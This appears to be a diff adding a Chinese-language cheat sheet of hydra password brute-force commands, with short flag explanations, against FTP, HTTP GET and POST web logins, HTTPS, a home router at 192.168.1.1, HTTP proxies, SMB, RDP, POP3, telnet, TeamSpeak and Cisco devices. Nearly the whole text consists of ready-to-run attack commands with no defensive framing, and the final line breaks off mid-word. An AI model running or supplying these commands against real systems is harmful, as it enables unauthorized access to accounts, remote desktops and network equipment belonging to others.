@@ -1,0 +1,50 @@
+各种协议破解汇总
+
+FTP协议破解
+破解ftp：
+hydra -L 用户名字典 -P 密码字典 -t 6 -e ns IP地址 -v
+
+http协议破解
+get方式提交，破解web登录：
+hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns IP地址 http-get /admin/
+hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns -f IP地址 http-get /admin/index.php
+post方式提交，破解web登录：
+hydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form "/admin/index.php?action=login:user=USER&pw=PASS:"
+#/index.php …这个是登录的 url
+#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替
+#然后是如果登录出错 会出现的字符 。。。然后开始破解
+
+https协议破解
+破解https
+hydra -m /index.php -l 用户名 -P 密码字典.txt IP地址 https
+
+路由器破解
+hydra -l admin -x 6:10:1a.~!@#$%^&()-= -t 8 192.168.1.1 http-get /
+-l admin 为尝试破解的用户名。
+# -x 6:10:1a. 表示枚举的密码由 数字、小写字母和单字符’.'等等组成，长度为 6 - 10 位。-t 8 表示分 8 个并行任务进行爆破尝试。192.168.1.1 为 Router 地址。http-get 为破解方式（协议）
+
+http-proxy协议破解
+破解http-proxy：
+hydra -l admin -P 字典.txt http-proxy://IP地址
+
+smb破解
+破解smb：
+hydra -l 用户名字典 -P 密码字典 IP地址 smb
+
+ Windows远程桌面
+破解rdp(windows远程登录)：
+hydra ip地址 rdp -l administrator -P 密码字典.txt -V
+
+邮箱pop3
+破解邮箱pop3：
+hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3
+
+telnet破解
+hydra ip地址 telnet -l 用户字典.txt -P 密码字典.txt -t 32 -s 23 -e ns -f -V
+
+语音通讯工具teamspeak
+hydra -l 用户名字典 -P 密码字典.txt -s 端口号 -vV ip teamspeak
+
+cisco
+hydra -P 密码字典 IP地址 cisco
+hydra -m cloud -P 密码字典 IP地址 cisco-enabl
